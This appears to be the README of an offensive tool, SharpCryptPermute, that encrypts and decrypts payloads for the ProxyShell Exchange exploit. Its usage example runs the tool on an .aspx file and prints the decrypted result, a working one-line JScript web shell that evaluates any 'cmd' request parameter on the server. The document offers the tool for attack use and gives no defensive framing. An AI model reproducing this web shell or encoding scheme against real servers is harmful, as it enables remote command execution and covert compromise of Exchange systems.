# SharpCryptPermute
 Crypt/Decrypt Proxyshell Payload

```
>SharpCryptPermute.exe -enc aaa.aspx
[+] Encrypt String:
ldZUhrdpFDnNqQbf96nf2v+CYWdUhrdpFII5hvcGqRT/gtbahqXahoI5uanf2jmp1mlU041pqRT/FIb32tld9wZUFLfTBjm5qd/aKSDTqQ2MyenapanNjL7aXPfa1hR+glSNDYIPa4L3BtapXdqCyTEhlfvWVIa3aRTZ

>SharpCryptPermute.exe -dec ldZUhrdpFDnNqQbf96nf2v+CYWdUhrdpFII5hvcGqRT/gtbahqXahoI5uanf2jmp1mlU041pqRT/FIb32tld9wZUFLfTBjm5qd/aKSDTqQ2MyenapanNjL7aXPfa1hR+glSNDYIPa4L3BtapXdqCyTEhlfvWVIa3aRTZ
[+] Decrypt  String:
<script language='JScript' runat='server' Page aspcompat=true>function Page_Load(){eval(Request['cmd'],'unsafe');}</script>
```